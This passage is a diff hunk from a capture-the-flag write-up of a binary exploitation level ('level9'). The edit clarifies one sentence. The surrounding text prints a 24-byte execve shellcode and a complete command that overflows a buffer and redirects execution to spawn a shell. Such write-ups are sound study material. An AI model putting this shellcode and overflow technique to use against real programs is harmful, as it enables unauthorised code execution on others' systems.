@@ -161,7 +161,7 @@ End of assembler dump.
 We now have enough information to try to get the flag, as we don't have any call to `system()` function here we will need to pass a *shellcode* as in `level2`
 __Shell code__ `'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'` that gives us a total of `24 bytes` we know the *offset* is 108 - 24 for the shell code and 4 for the address what leaves us with *80 bytes* of random characters
 
-We overwrite the `ebx` __address__ with our string start __address__ *(0x804a00c) remember little end first* and we need to put anywhere from our string as to where our address is pointing to the random string
+We overwrite the `ebx` __address__ with our string start __address__ *(0x804a00c) remember little end first* and we need to put anywhere *(__address__)* from our string as to where our address is pointing to the random string
 ```
 ./level9 $(python -c "print '\x10\xa0\x04\x08' + 'A' * 80 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\x0c\xa0\x04\x08'")
 
